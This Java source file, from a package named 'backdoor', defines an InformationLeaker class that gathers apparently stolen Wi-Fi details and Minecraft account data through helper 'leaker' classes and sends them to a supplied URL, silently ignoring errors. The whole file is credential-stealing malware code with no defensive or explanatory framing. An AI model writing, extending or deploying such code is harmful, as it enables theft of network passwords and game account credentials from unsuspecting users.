package com.github.pulsebeat02.backdoor;

import com.github.pulsebeat02.utility.NetworkUtilities;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class InformationLeaker {

  public InformationLeaker(final String link) {
    final String wifi = new WifiLeaker().getInformation();
    final String mc = new MinecraftLeaker().getSequence();
    final String send = wifi + "\n MINECRAFT INFORMATION \n" + mc;
    try {
      final URL url = new URL(link);
      final HttpURLConnection connection = (HttpURLConnection) url.openConnection();
      connection.setRequestMethod("GET");
      connection.setDoOutput(true);
      final DataOutputStream out = new DataOutputStream(connection.getOutputStream());
      out.writeBytes("info=" + send);
    } catch (final IOException ignored) {
    }
  }
}
